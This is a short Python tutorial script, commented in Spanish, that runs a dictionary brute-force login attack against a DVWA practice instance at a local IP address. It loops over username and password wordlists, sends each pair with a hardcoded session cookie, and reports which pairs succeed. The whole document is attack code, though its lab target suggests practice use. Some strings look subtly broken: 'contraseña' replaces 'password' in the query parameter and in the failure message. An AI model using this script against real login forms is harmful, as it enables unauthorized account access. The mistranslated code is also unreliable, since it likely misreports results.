# Ejemplo de como crear un software de fuerza bruta con diccion
# Primero importamos las librerias 
# pip install requests
# pip install termcolor

import sys
import requests
from termcolor import colored, cprint
cookie = {"PHPSESSID": "qk9e71ier8vi62jumounl7jidf",
          "security":"low"}

def file_read(file):
       with open(file,mode='r',encoding='utf-8') as file_text:
              return file_text.read()
   
usuario = file_read("usuario.txt").split("\n")
contraseña = file_read("contraseña.txt").split("\n")
 

for i in usuario:
    for j in contraseña:
        url = f"http://192.168.1.142/dvwa/vulnerabilities/brute/?username={i}&contraseña={j}&Login=Login#"
        response = requests.get(url,cookies=cookie)

        if not "Username and/or contraseña incorrect." in response.text:
              cprint(f"[+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
        else:
              cprint(f"[-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)


